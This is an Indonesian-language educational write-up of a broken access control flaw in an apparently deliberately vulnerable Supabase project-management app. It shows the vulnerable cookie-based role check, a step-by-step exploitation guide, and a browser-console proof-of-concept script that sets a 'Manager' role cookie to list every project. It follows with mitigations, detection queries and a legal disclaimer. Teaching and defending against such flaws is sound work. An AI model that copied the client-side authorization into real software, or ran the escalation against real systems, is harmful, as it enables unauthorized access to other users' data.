# Broken Access Control - Privilege Escalation via Cookie Manipulation

## ğŸ“‹ Ringkasan Vulnerability

**Jenis:** Broken Access Control - Horizontal Privilege Escalation  
**OWASP Category:** A01:2021 â€“ Broken Access Control  
**CWE ID:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**Severity:** HIGH (CVSS 8.1)  
**Lokasi:** `src/components/Projects/ProjectList.tsx` - fungsi `loadProjects()`  
**Impact:** User biasa (Member) dapat melihat SEMUA projects dengan memanipulasi role di cookies

---

## ğŸ”´ Masalah Keamanan

### **Root Cause: Client-Side Authorization**

Aplikasi melakukan **access control check di client-side** menggunakan data dari cookies yang dapat dimanipulasi oleh attacker.

```typescript
// âŒ VULNERABLE CODE - Line 26-35
const getCookieValue = (name: string) => {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop()?.split(';').shift();
  return null;
};

const userRole = getCookieValue('user_role'); // âš ï¸ Trust client data!
const userId = getCookieValue('user_id');

if (userRole === 'Manager') {
  // Fetch ALL projects without filtering
  const { data } = await supabase.from("projects").select('*');
} else {
  // Fetch only user's projects
  const { data } = await supabase.from("projects")
    .select('*')
    .eq('project_members.user_id', userId);
}
```

### **Kenapa Ini Berbahaya?**

1. **Client-Side Control:** Role diambil dari cookies yang bisa diubah user
2. **No Server Validation:** Tidak ada authorization check di backend/database
3. **Trust User Input:** Aplikasi percaya data dari client tanpa verifikasi
4. **Privilege Escalation:** Member bisa upgrade role jadi Manager secara ilegal

---

## ğŸ¯ Exploitation Guide

### **Scenario: Member â†’ Manager Privilege Escalation**

**Situasi:**
- User A (Manager) membuat Project X, Y, Z
- User B (Member) hanya member di Project Y
- Seharusnya User B hanya bisa lihat Project Y
- **Tapi User B bisa manipulate cookies untuk lihat SEMUA projects!**

---

### **Step 1: Login sebagai Member**

```
Email: member@example.com
Password: member123
Role: Member (role normal)
```

Setelah login, buka **Developer Tools > Application > Cookies**

Anda akan melihat cookies:
```
user_email = member@example.com
user_password = member123
user_id = abc-def-ghi-123
user_role = Member          â† ğŸ¯ Target cookie!
user_name = John Doe
```

---

### **Step 2: Lihat Projects - Normal Behavior**

Buka halaman **Projects**. Anda akan melihat:
- âœ… Project Y (dimana Anda adalah member)
- âŒ Project X (tidak terlihat - milik Manager lain)
- âŒ Project Z (tidak terlihat - milik Manager lain)

Console log menunjukkan:
```
ğŸ” Loading projects with role: Member
ğŸ‘¤ MEMBER MODE: Fetching only user projects
âœ… Loaded 1 projects (USER PROJECTS ONLY)
```

---

### **Step 3: Manipulasi Cookie untuk Privilege Escalation**

**Buka Developer Tools > Console** dan jalankan:

```javascript
// EXPLOIT: Ubah role dari "Member" menjadi "Manager"
document.cookie = "user_role=Manager; path=/; max-age=604800";

// Verify perubahan
console.log('Current role:', document.cookie.split(';')
  .find(c => c.includes('user_role'))?.split('=')[1]);
// Output: Manager

// Reload halaman atau refresh projects
location.reload();
```

**Atau manual via DevTools:**
1. Developer Tools > Application > Cookies
2. Double-click pada value "Member" di cookie `user_role`
3. Ubah menjadi "Manager"
4. Tekan Enter
5. Refresh halaman (F5)

---

### **Step 4: Verifikasi Privilege Escalation Berhasil**

Setelah refresh, lihat halaman Projects lagi:
- âœ… Project X (sekarang terlihat!)
- âœ… Project Y (masih terlihat)
- âœ… Project Z (sekarang terlihat!)

Console log menunjukkan:
```
ğŸ” Loading projects with role: Manager
âš ï¸ MANAGER MODE: Fetching ALL projects (no filtering)
âœ… Loaded 3 projects (ALL PROJECTS)
```

**ğŸ‰ EXPLOIT BERHASIL!** User Member sekarang bisa lihat semua projects seperti Manager!

---

### **Step 5: Akses Unauthorized Data**

Setelah privilege escalation, User B (yang seharusnya Member biasa) bisa:

1. **Lihat semua projects** dari semua users
2. **Klik project orang lain** untuk masuk ke detail
3. **Akses data sensitif:**
   - Tasks dari project orang lain
   - Files yang di-upload orang lain
   - Chat messages dari tim lain
   - Timeline/activity logs
   - Member list dari project lain

---

## ğŸ§ª Proof of Concept (PoC)

### **Automated Exploitation Script**

Jalankan script ini di Console setelah login sebagai Member:

```javascript
// ===== BROKEN ACCESS CONTROL EXPLOIT =====
// Privilege Escalation: Member â†’ Manager

console.log('ğŸš€ Starting Privilege Escalation Attack...\n');

// Step 1: Check current role
const getCurrentRole = () => {
  const cookie = document.cookie.split(';')
    .find(c => c.trim().startsWith('user_role='));
  return cookie ? cookie.split('=')[1] : 'Unknown';
};

console.log('ğŸ“Š Current Role:', getCurrentRole());

// Step 2: Escalate to Manager
console.log('\nğŸ”“ Escalating privileges...');
document.cookie = "user_role=Manager; path=/; max-age=604800";

// Verify
const newRole = getCurrentRole();
console.log('âœ… New Role:', newRole);

if (newRole === 'Manager') {
  console.log('\nğŸ‰ PRIVILEGE ESCALATION SUCCESSFUL!');
  console.log('ğŸ“‚ You can now access ALL projects in the system');
  console.log('âš ï¸ Refreshing page to load all projects...\n');
  
  setTimeout(() => {
    location.reload();
  }, 2000);
} else {
  console.log('\nâŒ Escalation failed');
}

// Step 3: After reload, fetch all projects directly
setTimeout(async () => {
  console.log('\nğŸ” Fetching ALL projects via Supabase...');
  
  const { data, error } = await supabase
    .from('projects')
    .select('id, name, description, status, created_by');
  
  if (!error) {
    console.log(`\nâœ… Successfully fetched ${data.length} projects:`);
    console.table(data);
    
    console.log('\nâš ï¸ IMPACT DEMONSTRATION:');
    console.log(`- You are a "Member" but can see ${data.length} total projects`);
    console.log('- You can view details, tasks, files, and chats of ALL projects');
    console.log('- This is a critical Broken Access Control vulnerability!');
  }
}, 3000);
```

---

## ğŸ“Š Impact Analysis

### **Confidentiality Impact: HIGH**
- âŒ User dapat melihat project confidential milik tim lain
- âŒ Akses ke business-sensitive information tanpa authorization
- âŒ Breach of privacy untuk semua project stakeholders

### **Integrity Impact: MEDIUM**
- âš ï¸ User mungkin bisa modify data di project orang lain (depends on other checks)
- âš ï¸ Bisa upload malicious files ke project orang lain
- âš ï¸ Bisa manipulate tasks atau chat messages

### **Availability Impact: LOW**
- âš ï¸ User bisa delete resources dari project orang lain (jika tidak ada validasi)
- âš ï¸ Denial of service potential

### **Business Impact:**
- ğŸ’° **Competitive Intelligence Leak:** Competitor bisa lihat semua projects
- ğŸ“‰ **Loss of Customer Trust:** Privacy breach
- âš–ï¸ **Legal/Compliance Issues:** GDPR, data protection violations
- ğŸ’¸ **Financial Loss:** Potential lawsuits, penalties

---

## âœ… Mitigasi & Patching

### **Solusi 1: Server-Side Authorization (RECOMMENDED)**

Implementasi Row Level Security (RLS) di Supabase:

```sql
-- Enable RLS on projects table
ALTER TABLE projects ENABLE ROW LEVEL SECURITY;

-- Policy: Users can only see projects where they are members
CREATE POLICY "Users can view their projects"
ON projects
FOR SELECT
USING (
  auth.uid() IN (
    SELECT user_id 
    FROM project_members 
    WHERE project_id = projects.id
  )
  OR
  auth.uid() = created_by
);

-- Policy: Only managers can see all projects (server-side check)
CREATE POLICY "Managers can view all projects"
ON projects
FOR SELECT
USING (
  EXISTS (
    SELECT 1 
    FROM profiles 
    WHERE id = auth.uid() 
    AND role = 'Manager'
  )
);
```

---

### **Solusi 2: Backend API Endpoint**

Buat API endpoint untuk authorization check:

```typescript
// Backend: /api/projects
export async function GET(request: Request) {
  const userId = await getUserIdFromToken(request);
  const userRole = await getUserRoleFromDatabase(userId); // âœ… From database, not cookies!
  
  let projects;
  
  if (userRole === 'Manager') {
    // Manager bisa lihat semua
    projects = await db.projects.findMany();
  } else {
    // Member hanya lihat projects mereka
    projects = await db.projects.findMany({
      where: {
        project_members: {
          some: { user_id: userId }
        }
      }
    });
  }
  
  return Response.json(projects);
}
```

---

### **Solusi 3: Fix Client-Side Code (Temporary)**

Update ProjectList.tsx untuk menggunakan profile dari AuthContext:

```typescript
// âœ… SECURE CODE
const loadProjects = async () => {
  try {
    // Ambil role dari AuthContext yang sudah diverifikasi via Supabase
    const userRole = profile?.role; // âœ… From authenticated session
    const userId = user?.id; // âœ… From Supabase auth
    
    if (!userId) {
      console.log('User not authenticated');
      return;
    }
    
    let query = supabase.from("projects").select(`
      *,
      project_members(count)
    `);
    
    // Server-side RLS will handle filtering
    // But we add client filter as additional layer
    if (userRole !== 'Manager') {
      query = query.eq('project_members.user_id', userId);
    }
    
    const { data, error } = await query.order("created_at", { ascending: false });
    
    if (error) throw error;
    setProjects(data || []);
  } catch (error) {
    console.error("Error loading projects:", error);
  }
};
```

**CATATAN:** Client-side fix saja **TIDAK CUKUP**. Harus dikombinasikan dengan server-side RLS!

---

### **Solusi 4: Validation & Logging**

```typescript
// Add server-side audit logging
const logAccessAttempt = async (userId: string, projectId: string, authorized: boolean) => {
  await supabase.from('access_logs').insert({
    user_id: userId,
    resource_type: 'project',
    resource_id: projectId,
    action: 'view',
    authorized: authorized,
    timestamp: new Date().toISOString(),
    ip_address: request.headers.get('x-forwarded-for')
  });
};

// Detect anomalies
if (userRole === 'Manager' && cookieRole === 'Member') {
  console.warn('âš ï¸ SECURITY ALERT: Role mismatch detected!');
  logAccessAttempt(userId, projectId, false);
  // Block access or trigger investigation
}
```

---

## ğŸ›¡ï¸ Defense in Depth Strategy

### **Layer 1: Authentication**
- âœ… Never store role in cookies
- âœ… Use JWT tokens dengan role di payload (server-signed)
- âœ… Implement httpOnly, secure, sameSite cookies

### **Layer 2: Authorization**
- âœ… Implement Row Level Security (RLS) di database
- âœ… Server-side role validation
- âœ… Principle of Least Privilege

### **Layer 3: Monitoring**
- âœ… Access logging untuk semua operations
- âœ… Anomaly detection (role changes, unusual access patterns)
- âœ… Real-time alerting untuk suspicious activities

### **Layer 4: Application Security**
- âœ… Input validation
- âœ… CSRF protection
- âœ… Regular security audits

---

## ğŸš¨ Detection & Monitoring

### **Indicators of Compromise (IoC):**

1. **Cookie manipulation detected:**
   ```
   user_role changed from "Member" to "Manager"
   Login timestamp mismatch
   ```

2. **Unusual access patterns:**
   ```
   Member accessing 10+ projects (more than their membership count)
   Sequential access to all projects in short timeframe
   ```

3. **Console warnings:**
   ```
   Look for: "MANAGER MODE: Fetching ALL projects"
   When user should be "Member"
   ```

### **Monitoring Query:**

```sql
-- Detect users accessing more projects than they should
SELECT 
  user_id,
  COUNT(DISTINCT project_id) as accessed_projects,
  (SELECT COUNT(*) FROM project_members WHERE user_id = access_logs.user_id) as actual_memberships
FROM access_logs
WHERE resource_type = 'project'
GROUP BY user_id
HAVING accessed_projects > actual_memberships + 2;
```

---

## ğŸ“š Referensi

- [OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [Supabase Row Level Security (RLS)](https://supabase.com/docs/guides/auth/row-level-security)
- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)

---

## âš–ï¸ Disclaimer

Dokumentasi ini dibuat untuk **educational purposes** dalam konteks aplikasi vulnerable yang disengaja. 

**âš ï¸ JANGAN exploit vulnerability ini di production systems tanpa izin!**

Melakukan unauthorized access adalah **ILEGAL** dan dapat berakibat:
- Tuntutan hukum (UU ITE, Computer Fraud and Abuse Act, etc.)
- Denda finansial
- Hukuman penjara

Gunakan knowledge ini hanya untuk:
- âœ… Security testing di environment sendiri
- âœ… Responsible disclosure ke vendor
- âœ… Educational/training purposes
- âœ… Authorized penetration testing

---

## ğŸ“ Learning Objectives

Setelah mempelajari vulnerability ini, Anda harus memahami:

1. âœ… **Never trust client-side data** untuk authorization
2. âœ… **Always validate permissions server-side** (database RLS, API middleware)
3. âœ… **Role-based access control** harus diimplementasi di backend
4. âœ… **Defense in depth** - multiple layers of security
5. âœ… **Logging & monitoring** untuk detect anomalies

**Remember:** Security is NOT a checkbox, it's a process! ğŸ”’
